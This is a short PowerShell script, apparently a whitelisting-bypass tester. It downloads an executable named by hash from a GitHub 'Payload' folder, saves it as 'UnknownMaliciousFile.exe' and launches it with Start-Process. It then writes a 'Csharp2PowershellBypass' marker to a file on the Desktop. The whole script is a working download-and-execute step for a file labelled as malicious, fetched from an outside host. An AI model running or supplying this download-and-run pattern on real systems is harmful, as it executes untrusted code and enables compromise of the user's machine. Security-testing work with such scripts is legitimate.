$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/159d55a9e2eb957ce2326f4f46ceb54b72aeef5251299f0029ee5ac05366aad3.exe'
$output = "UnknownMaliciousFile.exe"
$start_time = Get-Date

[ Net.ServicePointManager ]::SecurityProtocol  = [Net.SecurityProtocolType]::Tls12 

wget $url -outfile $output

Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

Start-Process -FilePath "UnknownMaliciousFile.exe"

$DesktopPath = [Environment]::GetFolderPath('Desktop');echo Csharp2PowershellBypass >> $DesktopPath\\WLtester.txt;